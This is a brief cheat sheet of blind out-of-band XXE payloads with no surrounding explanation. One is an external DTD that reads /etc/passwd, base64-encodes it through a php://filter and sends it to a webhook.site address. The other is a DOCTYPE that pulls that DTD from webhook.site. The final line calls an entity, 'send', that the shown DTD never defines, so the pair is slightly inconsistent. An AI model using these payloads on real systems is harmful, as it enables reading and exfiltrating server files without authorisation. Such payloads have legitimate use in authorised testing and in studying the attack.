# XXE blind OOB :

https://www.w3schools.com/xml/xml_dtd_intro.asp

# XXE blind payload [DTD file] :

<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://webhook.site/?%file;'>">
%eval;
%exfil;

# XXE blind payload [CALL DTD FILE] :

<!DOCTYPE data [
  <!ENTITY % dtd SYSTEM
  "http://webhook.site/evil.dtd">
  %dtd;
  ]>
<data>&send;</data>

